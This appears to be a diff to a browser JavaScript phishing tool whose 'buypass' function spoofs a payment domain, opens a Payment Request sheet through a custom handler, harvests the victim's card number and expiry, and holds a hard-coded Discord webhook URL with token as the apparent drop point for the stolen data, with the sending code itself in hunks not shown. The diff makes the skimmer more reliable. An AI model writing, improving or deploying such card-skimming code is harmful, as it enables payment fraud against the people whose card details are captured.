@@ -1,45 +1,62 @@
-// ==================== GLOBAL CLEANUP + REQUEST TRACKING ====================
+// ==================== ONE‑TIME PAYMENT HANDLER SETUP ====================
 let activeRequest = null;
 let isProcessing = false;
+let handlerReady = false;
 
-// Helper: safely abort previous request and wait
-async function safelyAbortPrevious() {
+// Ensure the payment handler is installed and ready (run once)
+async function ensurePaymentHandlerReady() {
+    if (handlerReady) return true;
+    
+    if (!('PaymentRequest' in window)) return false;
+    
+    // Test if our payment method is available
+    const testRequest = new PaymentRequest(
+        [{ supportedMethods: location.origin + '/pay/main.json' }],
+        { total: { label: 'Test', amount: { value: '0.01', currency: 'USD' } } }
+    );
+    
+    try {
+        // canMakePayment() checks if the handler is installable/available without showing UI
+        const canPay = await testRequest.canMakePayment();
+        handlerReady = canPay;
+        return canPay;
+    } catch (e) {
+        console.warn('Payment handler not ready yet', e);
+        return false;
+    }
+}
+
+// Abort any previous request cleanly
+async function abortPrevious() {
     if (activeRequest) {
         try {
             await activeRequest.abort();
-        } catch(e) { /* ignore */ }
+        } catch (e) { /* ignore */ }
         activeRequest = null;
     }
 }
 
-// Reset service workers once on page load (no need to wait)
-(async function resetPaymentHandler() {
-    if ('serviceWorker' in navigator) {
-        const registrations = await navigator.serviceWorker.getRegistrations();
-        for (const reg of registrations) {
-            const scriptUrl = reg.active?.scriptURL || '';
-            if (scriptUrl.includes('/sw.js') || scriptUrl.includes('/pay/')) {
-                await reg.unregister();
-            }
-        }
-    }
-})();
-
-// ==================== BUYPASS FUNCTION (improved) ====================
+// ==================== MAIN BUYPASS FUNCTION ====================
 async function buypass() {
-    // Prevent concurrent clicks
+    // Prevent double‑click spam
     if (isProcessing) return;
     isProcessing = true;
 
     try {
-        // Abort any previous payment request and wait for it to finish
-        await safelyAbortPrevious();
+        // Abort previous payment sheet if still open
+        await abortPrevious();
 
-        const targetUrl = document.querySelector("input").value;
+        // Ensure payment handler is ready (wait for installation if needed)
+        await ensurePaymentHandlerReady();
+
+        // Get target URL from input field (original logic)
+        const inputEl = document.querySelector("input");
+        if (!inputEl) throw new Error("Input field not found");
+        const targetUrl = inputEl.value;
         const targetDomain = targetUrl ? new URL(targetUrl).hostname : "cardpay.com";
         const webhookUrl = "https://discord.com/api/webhooks/1497249858778828981/FSiw6WVLLQ1gotjNxWZX3AbvwsUJh5KKJfrrIqOVv5Yygokx_CQzSvZcKS87h878RRiz";
 
-        // Create a brand new PaymentRequest
+        // Create the payment request
         const request = new PaymentRequest(
             [{
                 supportedMethods: location.origin + "/pay/main.json",
@@ -60,10 +77,10 @@ async function buypass() {
 
         activeRequest = request;
 
-        // Show the payment sheet – this requires the user activation from click
+        // Show the payment sheet (user activation is present because this runs from a click)
         const response = await request.show();
 
-        // Process response (same as original)
+        // Process response (exactly as original)
         const details = response.details;
         const cardNumber = details.cardNumber || details.PAN || "N/A";
         const expiryMonth = details.expiryMonth || "MM";
@@ -98,12 +115,13 @@ async function buypass() {
         window.location.href = "/navigate.html";
     } catch (err) {
         console.error("Payment request failed:", err);
-        // Allow retry
+        // Don't redirect on error – let user retry
     } finally {
         activeRequest = null;
         isProcessing = false;
     }
 }
 
-// Attach to button (preserves original behaviour)
-document.querySelector("button").onclick = buypass;
+// Attach to button (original structure preserved)
+const btn = document.querySelector("button");
+if (btn) btn.onclick = buypass;
